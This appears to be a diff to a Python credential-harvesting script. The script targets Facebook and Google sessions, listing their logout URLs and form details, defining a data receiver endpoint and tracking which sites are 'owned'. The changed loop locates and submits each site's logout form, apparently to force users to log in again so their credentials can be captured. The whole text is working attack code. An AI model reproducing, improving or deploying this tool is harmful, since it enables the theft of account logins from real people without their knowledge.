@@ -8,14 +8,14 @@ data_receiver = "http://localhost:8080"
 target_sites = {}
 target_sites["www.facebook.com"] = {
     "logout_url": None,
-    "logout_form": "logout_form",
+    "logout_form_action": "https://www.facebook.com/logout.php",
     "login_form_index": 0,
     "owned": False
 }
 
 target_sites["accounts.google.com"] = {
     "logout_url": "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
-    "logout_form": None,
+    "logout_form_action": None,
     "login_form_index": 0,
     "owned": False
 }
@@ -57,7 +57,7 @@ while True:
                 for i in full_doc:
                     try:
                         # find the logout form and submit it:
-                        if i.id == target_sites[url.hostname]["logout_form"]:
+                        if i.action == target_sites[url.hostname]["logout_form_action"]:
                             i.submit()
                             wait_for_browser(browser)
 
